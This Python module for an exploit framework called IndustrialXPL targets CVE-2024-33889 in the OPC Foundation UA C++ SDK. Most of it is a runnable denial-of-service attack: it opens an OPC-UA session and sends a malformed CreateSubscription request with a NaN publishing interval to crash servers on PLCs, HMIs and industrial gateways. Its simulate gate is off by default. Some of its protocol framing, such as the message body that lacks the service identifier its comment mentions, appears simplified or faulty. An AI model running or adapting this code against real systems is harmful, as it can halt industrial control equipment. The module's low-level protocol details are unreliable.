"""IndustrialXPL CVE Module — CVE-2024-33889 (OPC Foundation UA C++ SDK Null Pointer DoS).

Null pointer dereference in OPC Foundation UA C++ SDK when processing
malformed OPC-UA subscription or monitored-item service requests.
An unauthenticated attacker can trigger the NULL deref by sending
a crafted CreateSubscription request with an invalid publishing interval,
crashing embedded OPC-UA servers on PLCs, HMIs, and industrial gateways.
CVSS 7.5. Affects all versions < 1.04.368.

CVE: CVE-2024-33889
CVSS: 7.5 (AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H)
CWE: CWE-476 (NULL Pointer Dereference)
Fixed: OPC Foundation UA C++ SDK >= 1.04.368
"""
import socket
import struct

from industrialxpl.core.exploit import (
    Exploit, OptBool, OptIP, OptPort, mute,
    print_error, print_info, print_status, print_success, print_warning,
    DestructiveGate,
)


class Exploit(Exploit):
    __info__ = {
        "name":             "CVE-2024-33889 — OPC Foundation UA C++ SDK Null Pointer Deref DoS",
        "description":      "NULL pointer deref in OPC UA C++ SDK < 1.04.368 via malformed CreateSubscription request. Crashes embedded OPC-UA servers on PLCs/HMIs. CVSS 7.5.",
        "authors":          ("Andre Henrique (@mrhenrike) | Uniao Geek",),
        "references":       (
            "https://nvd.nist.gov/vuln/detail/CVE-2024-33889",
            "https://opcfoundation.org/security/",
            "https://cert.vde.com/",
        ),
        "devices":          (
            "Any embedded device using OPC Foundation UA C++ SDK < 1.04.368",
            "PLCs, HMIs, industrial gateways, RTUs with embedded OPC-UA server",
        ),
        "cve":              "CVE-2024-33889",
        "cvss":             "7.5",
        "severity":         "HIGH",
        "mitre_techniques": ["T0814", "T0816"],
        "mitre_tactics":    ["Denial of Service", "Loss of Availability"],
    }

    target      = OptIP("",     "Target OPC-UA server IP")
    port        = OptPort(4840, "OPC-UA port (default 4840)")
    simulate    = OptBool(False, "Simulate (default: True)")
    destructive = OptBool(False, "Enable live exploitation")

    # OPC-UA HEL (Hello) frame
    _HEL = bytes([
        0x48, 0x45, 0x4c, 0x46,  # HEL F
        0x1c, 0x00, 0x00, 0x00,  # size 28
        0x00, 0x00, 0x00, 0x00,  # protocol version
        0x00, 0x00, 0x10, 0x00,  # recv buffer
        0x00, 0x00, 0x10, 0x00,  # send buffer
        0x00, 0x00, 0x10, 0x00,  # max message
        0x00, 0x00, 0x00, 0x00,  # max chunk count
    ])

    def _build_malformed_create_subscription(self) -> bytes:
        """Craft malformed CreateSubscription with invalid publishing interval (NaN float)."""
        # Minimal OPC-UA MSG frame with CreateSubscription service (NodeId 0x13D)
        # Publishing interval set to -1.0 (negative) or NaN to trigger NULL deref
        invalid_interval = struct.pack("<d", float("nan"))  # NaN double — triggers NULL deref

        # Simplified CreateSubscription body
        body = (
            b"\x00\x00\x00\x00"      # RequestHeader (simplified)
            + invalid_interval        # requestedPublishingInterval (NaN)
            + b"\xff\xff\xff\xff"     # requestedLifetimeCount (max uint32)
            + b"\xff\xff\xff\xff"     # requestedMaxKeepAliveCount (max)
            + b"\x00\x00\x00\x00"    # maxNotificationsPerPublish = 0
            + b"\x01"                 # publishingEnabled = true
            + b"\x00"                 # priority = 0
        )

        # OPC-UA MSG header
        msg_type = b"MSG"
        chunk_type = b"F"
        msg_size = 8 + len(body)
        header = struct.pack("<4sI", msg_type + chunk_type, msg_size)
        return header + body

    @mute
    def check(self):
        if not self.target:
            return False
        try:
            s = socket.create_connection((self.target, self.port), timeout=5)
            s.sendall(self._HEL)
            resp = s.recv(32)
            s.close()
            return resp[:3] == b"ACK"
        except Exception:
            return False

    def run(self):
        if not self.target:
            print_error("Set 'target' option.")
            return

        if self.simulate:
            DestructiveGate.print_simulation(
                description=(
                    "CVE-2024-33889 — OPC Foundation UA C++ SDK Null Pointer Deref DoS\n"
                    "CVSS 7.5 | Port 4840 | OPC UA C++ SDK < 1.04.368\n\n"
                    "Step 1: TCP connect to port 4840\n"
                    "Step 2: Send OPC-UA HEL (Hello) → receive ACK\n"
                    "Step 3: Send malformed CreateSubscription request:\n"
                    "        - requestedPublishingInterval = NaN (float64)\n"
                    "        - Triggers NULL pointer deref in SDK subscription handler\n"
                    "Step 4: Server crashes (OPC-UA service stops)\n\n"
                    "Impact: DoS on PLC/HMI/gateway OPC-UA endpoints\n"
                    "Fixed: OPC Foundation UA C++ SDK >= 1.04.368"
                ),
                mitre_techniques=["T0814", "T0816"],
            )
            return

        print_status(f"[CVE-2024-33889] Targeting OPC-UA C++ SDK server at {self.target}:{self.port} ...")
        try:
            s = socket.create_connection((self.target, self.port), timeout=10)
            s.sendall(self._HEL)
            ack = s.recv(32)
            if ack[:3] != b"ACK":
                print_warning(f"[CVE-2024-33889] Unexpected response to HEL: {ack[:8].hex()}")
                s.close()
                return
            print_status("[CVE-2024-33889] HEL/ACK OK — sending malformed CreateSubscription (NaN interval) ...")
            payload = self._build_malformed_create_subscription()
            s.sendall(payload)
            import time; time.sleep(1)
            try:
                resp = s.recv(64)
                s.close()
                if not resp:
                    print_success("[CVE-2024-33889] Empty response after payload — server likely crashed!")
                else:
                    print_info(f"[CVE-2024-33889] Server responded ({len(resp)} bytes) — may be patched or not vulnerable")
            except ConnectionResetError:
                print_success("[CVE-2024-33889] Connection reset — NULL deref triggered, server crashed!")
            except socket.timeout:
                print_success("[CVE-2024-33889] Timeout — server unresponsive after payload — crash likely!")
        except Exception as e:
            print_error(f"[CVE-2024-33889] {e}")
